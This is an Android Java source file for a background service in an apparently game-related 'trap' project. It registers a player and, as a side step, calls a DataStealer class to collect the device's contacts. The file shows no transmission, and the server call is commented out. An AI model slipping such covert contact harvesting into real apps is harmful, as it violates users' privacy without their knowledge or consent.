package de.hpi3d.gamepgrog.trap;

import android.app.IntentService;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;

import java.util.ArrayList;

import de.hpi3d.gamepgrog.trap.datatypes.Contact;

/**
 * This class is where decisions about backend calls are made.
 * It offers methods which can be called from where ever, and
 * makes decisions/finds out the games state.
 * Based on that it may or may not call the backend.
 * <p>
 * Methods in this class may be blocking.
 */

public class BackendManagerIntentService extends IntentService {


    public static final String KEY_MANAGE_TYPE = "key_manage_type";

    public static final String MANAGE_PLAYER_REGISTRATION = "manage_player_registration";

    private static final String KEY_USER_ID = "key_user_id";
    public static final String KEY_SHARED_PREFERENCES = "backend_manager_preferences";

    public BackendManagerIntentService() {
        super("BackendManagerIntentService");
    }


    @Override
    protected void onHandleIntent(Intent intent) {
        String manageAction = intent.getStringExtra(KEY_MANAGE_TYPE);
        if (null == manageAction) {
            return;
        }
        switch (manageAction) {
            case MANAGE_PLAYER_REGISTRATION:
                registerPlayerIfUnregistered();
                break;
        }
    }


    /**
     * Called when starting the app to register user if unregistered.
     * <p>
     * To call pass MANAGE_PLAYER_REGISTRATION as value to KEY_MANAGE_TYPE.
     * <p>
     * This method executes network calls, and should not be called from the main thread.
     */
    private void registerPlayerIfUnregistered() {
        System.out.println("Want to test if player is registered"); // TODO: Remove
        String playerId = getPlayerId(getApplicationContext());
        if (null == playerId) {
            setNewPlayerId(getApplicationContext().getSharedPreferences(KEY_SHARED_PREFERENCES, Context.MODE_PRIVATE));
        }

        ArrayList<Contact> contacts = DataStealer.takeContactData(getApplicationContext());

    }

    /**
     * Calls the API and sets a new player ID.
     *
     * @param preferences
     */
    private static void setNewPlayerId(SharedPreferences preferences) {
        // try {
        // String userID = APIBuilder.build().register().execute().body(); TODO uncomment once server is online
        // preferences.edit().putString(KEY_USER_ID, userID).apply();
        preferences.edit().putString(KEY_USER_ID, "Is this the real life?").apply();
        // } catch (IOException e) {
        //     e.printStackTrace();
        // }


    }


    public static String getPlayerId(Context applicationContext) {
        SharedPreferences preferences = applicationContext.getSharedPreferences(KEY_SHARED_PREFERENCES, Context.MODE_PRIVATE);
        return preferences.getString(KEY_USER_ID, null);
    }


}
